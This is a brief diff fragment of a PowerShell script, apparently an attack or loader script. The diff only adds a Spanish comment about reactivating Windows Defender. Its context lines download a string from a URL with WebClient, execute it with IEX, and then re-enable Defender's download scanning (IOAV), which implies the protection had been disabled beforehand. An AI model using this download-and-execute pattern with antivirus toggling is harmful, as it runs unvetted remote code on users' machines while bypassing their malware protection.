@@ -8,6 +8,7 @@ $webclient = New-Object $objeto
 $webrequest = $webclient.DownloadString($url)
 IEX $webrequest
 sleep -Seconds 10
+################## Activamos Windows Defender ###########################
 Set-MpPreference -DisableIOAVProtection $False
 
 }
